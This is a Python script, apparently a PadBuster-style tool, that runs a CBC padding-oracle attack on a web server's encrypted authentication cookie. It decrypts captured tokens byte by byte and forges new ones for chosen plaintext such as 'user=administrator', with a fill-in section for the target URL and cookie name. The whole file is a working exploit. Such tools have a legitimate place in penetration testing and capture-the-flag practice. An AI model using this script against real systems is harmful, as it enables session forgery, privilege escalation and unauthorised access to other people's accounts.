#!/usr/bin/env python3

import requests
import base64
import sys

# ------------------------------- FILL IN -----------------------------
url = 'target URL'
block_size = 8
IV = b'0'*block_size

# This tool assumes that the sever expects the token in the form of a cookie. Here you can specify the name of the cookie
cookie_name = 'auth'

# This tool will look for the following string in the response from the padding oracle
# If it finds the response, it will consider that the padding is incorrect, if not, that the padding is correct
bad_padding_response = 'Invalid padding'

# Only for decrypt
original_token = 'base64 encoded token here'
# Only for encrypt
original_plaintext = 'user=administrator'
# ---------------------------------------------------------------------

plaintext_token = b''
offset=0

def b64decode_padding(data):
    missing_padding = len(data) % 4
    if missing_padding:
        data += '='* (4 - missing_padding)
    decoded = base64.b64decode(data)
    return decoded

def b64urldecode_padding(data):
    missing_padding = len(data) % 4
    if missing_padding:
        data += '='* (4 - missing_padding)
    decoded = base64.urlsafe_b64decode(data)
    return decoded

def test_token(token):
    if isinstance(token, list):
        token = b''.join(token)
    #print(f"testing token: {token.hex()}")
    token_encoded = base64.b64encode(token).decode()
    token_encoded = token_encoded.replace("+","%2B")
    token_encoded = token_encoded.replace("=","%3D")
    #print(token_encoded)
    cookies = {
        cookie_name : token_encoded,
    }
    response = requests.get(url, cookies=cookies)
    if bad_padding_response in response.text:
        return False
    else:
        return True

def tamper_and_test_byte_in_block(block_list, block_index, byte_index):
    block_index = len(block_list) - block_index -1
    pre_block = block_list[0:block_index]
    target_block = block_list[block_index]
    post_block = block_list[block_index+1:len(block_list)]

    modified_block = target_block[0:byte_index] + bytes([target_block[byte_index] +1 % 256]) + target_block[byte_index+1:block_size]
    test_block_list = pre_block
    test_block_list.append(modified_block)
    test_block_list = test_block_list + post_block
    #print(f"block split: {[i.hex() for i in test_block_list]}")
    return test_token(test_block_list)

def determine_nr_of_padding_bytes(block_list):
    print("Determining nr of padding bytes...")
    for i in range(0,block_size):
        success = tamper_and_test_byte_in_block(block_list, 1, i)
        if not success:
            print(f"detected number of padding bytes: {block_size - i}")
            return block_size - i
    print("[-] Failed to determine number of padding bytes in token to decrypt (token is bad or padding oracle is not working)")
    exit()

def increment_padding_bytes(token, nr_padding_bytes):
    xor_val = nr_padding_bytes ^ (nr_padding_bytes + 1)
    #print(f"Incrementing byte padding to {nr_padding_bytes+1}")
    for i in range(0, nr_padding_bytes):
        index = len(token)-i-1-block_size
        token = token[0:index] + bytes([token[index] ^ xor_val]) + token[index+1:len(token)]
    return token

def convert_padding_bytes(token, nr_padding_bytes, plaintext):
    #print(f"Converting byte padding to plaintext {plaintext}")
    for i in range(0, nr_padding_bytes):
        index = len(token)-i-1-block_size
        xor = nr_padding_bytes ^ plaintext[len(plaintext)-i-1]
        token = token[0:index] + bytes([token[index] ^ xor]) + token[index+1:len(token)]
    return token

def decrypt_byte(token, nr_padding_bytes):
    global plaintext_token
    index=len(token)-nr_padding_bytes-1-block_size
    #print(f"tampering with byte {offset-(2*block_size)+index+1} to spoof byte {offset-(2*block_size)+index+1+block_size} to padding value {nr_padding_bytes+1}")
    for i in range(0, 256):
        old_byte = token[index]
        updated_byte = i
        print(f"\r Testing byte value {abs(i-256)} -> ascii {bytes([(nr_padding_bytes+1) ^ i ^ old_byte])}                  ", end='')
        new_token = token[0:index] + bytes([updated_byte]) + token[index+1:len(token)]
        if test_token(new_token):
            print("\r                                                                                                                       \r", end='')
            plaintext_byte = bytes([(nr_padding_bytes+1) ^ i ^ old_byte])
            print(f"[+] decrypted byte {offset-block_size-nr_padding_bytes}: {plaintext_byte}")
            plaintext_token = plaintext_byte + plaintext_token
            return new_token
    print("[-] No valid result from oracle for any of the 256 bytes. If you are sure the oracle works properly, verify your encoding or communication with the oracle")
    exit()

def encrypt_byte(token, nr_padding_bytes):
    index=len(token)-nr_padding_bytes-1-block_size
    for i in range(0, 256):
        old_byte = token[index]
        updated_byte = i
        print(f"\r Testing byte value {abs(i-256)}                  ", end='')
        new_token = token[0:index] + bytes([updated_byte]) + token[index+1:len(token)]
        if test_token(new_token):
            print("\r                                                                                                                       \r", end='')
            print(f"[+] Found next padding byte (for byte {offset-nr_padding_bytes})")
            return new_token
    print("[-] No valid result from oracle for any of the 256 bytes. If you are sure the oracle works properly, verify your encoding or communication with the oracle")
    exit()

def decrypt_last_block(token, nr_padding_bytes):
    global plaintext_token
    print("")
    print(f"Decrypting block {int(offset/block_size)}")
    while nr_padding_bytes < block_size:
        token = increment_padding_bytes(token, nr_padding_bytes)
        token = decrypt_byte(token, nr_padding_bytes)
        nr_padding_bytes = nr_padding_bytes + 1
    print(f"[+] Block decrypted!")
    print(f"[+] intermediate plaintext: {plaintext_token}")

def encrypt_last_block(token, nr_padding_bytes, plaintext_block):
    print("")
    print(f"Encrypting block {int(offset/block_size)}")
    while nr_padding_bytes < block_size:
        token = increment_padding_bytes(token, nr_padding_bytes)
        token = encrypt_byte(token, nr_padding_bytes)
        nr_padding_bytes = nr_padding_bytes + 1

    print(f"[+] Created full padding block")
    encrypted_token = convert_padding_bytes(token, nr_padding_bytes, plaintext_block)
    print(f"[+] Block encrypted!")
    return encrypted_token

def decrypt_all(token):
    global offset
    block_list = [token[i:i+block_size] for i in range(0, len(token), block_size)]

    print("STARTING BLOCK DECRYPTION (last block first)")

    # Optimalisation for the last block
    offset = len(token)
    print("Using optimization for last block by detecting padding bytes")
    nr_padding_bytes = determine_nr_of_padding_bytes(block_list)
    decrypt_last_block(token, nr_padding_bytes)

    offset = len(token)-block_size
    while offset > block_size:
        # Send 2 blocks at a time
        decrypt_last_block(token[offset-(2*block_size):offset], 0)
        offset = offset - block_size

    print("")
    print("The final block can only be decoded if the IV is known. (If not known, you can try a block of null bytes)")
    print(f"Trying decoding with IV {IV}")
    decrypt_last_block(IV+token[0:block_size], 0)

def encrypt_all(plain_token):
    global offset
    offset = len(plain_token)
    encrypted_token = b'0'*(2*block_size)
    plaintext_block = plain_token[offset-block_size:offset]
    encrypted_token = encrypt_last_block(encrypted_token, 0, plaintext_block)
    full_token = encrypted_token
    print(f"[+] intermediate encrypted token: {full_token.hex()}")

    offset = offset - block_size
    while offset > 0:
        encrypted_token = (b'0'*block_size) + full_token[0:block_size]
        plaintext_block = plain_token[offset-block_size:offset]
        encrypted_token = encrypt_last_block(encrypted_token, 0, plaintext_block)
        full_token = encrypted_token[0:block_size] + full_token
        offset = offset - block_size
        print(f"[+] intermediate encrypted token: {full_token.hex()}")

    return full_token

def decrypt():
    bad_payload = b'0'*block_size
    if test_token(bad_payload):
        print("[-] Padding oracle indicates valid padding for impossible token. Please make sure you properly specified all required information.")
        exit()

    global original_token
    original_token = original_token.replace("%2B","+")
    original_token = original_token.replace("%3D","=")
    original_token_dec = b64decode_padding(original_token)
    block_list = [original_token_dec[i:i+block_size] for i in range(0, len(original_token_dec), block_size)]
    print(f"original token hex: {original_token_dec.hex()}")
    print(f"block split: {[i.hex() for i in block_list]}")
    print("")

    decrypt_all(original_token_dec)
    print(f"plaintext token: {plaintext_token}")

def encrypt():
    bad_payload = b'0'*block_size
    if test_token(bad_payload):
        print("[-] Padding oracle indicates valid padding for impossible token. Please make sure you properly specified all required information.")
        exit()

    padding_length = block_size - (len(original_plaintext) % block_size)
    plaintext_padding_bytes = bytes([padding_length])*padding_length
    token = original_plaintext.encode() + plaintext_padding_bytes
    print(f"original plaintext + padding: {token}")
    print(f"hexed plaintext + padding: {token.hex()}")
    block_list = [token[i:i+block_size] for i in range(0, len(token), block_size)]
    print(f"block split: {[i.hex() for i in block_list]}")
    print("")

    encrypted_token = encrypt_all(token)
    token_encoded = base64.b64encode(encrypted_token).decode()
    token_encoded = token_encoded.replace("+","%2B")
    token_encoded = token_encoded.replace("=","%3D")
    print(f"encrypted token: {token_encoded}")

def usage():
    print("Python padbuster usage:")
    print(f"{sys.argv[0]} [encrypt|decrypt]")
    print("")
    print("You must also edit the script and update all values in the section marked 'FILL IN'.")
    print("This tool also assumes that the server is using a cookie to store the CBC token in a base64 encoded format")
    print("If this is not the case, you might need to tinker with the functions 'encrypt', 'decrypt' and 'test_token' to supply the data in your desired format")



if len(sys.argv) != 2:
    print("Bad number of arguments!")
    usage()
else:
    if sys.argv[1] == "encrypt":
        encrypt()
    elif sys.argv[1] == "decrypt":
        decrypt()
    else:
        usage()



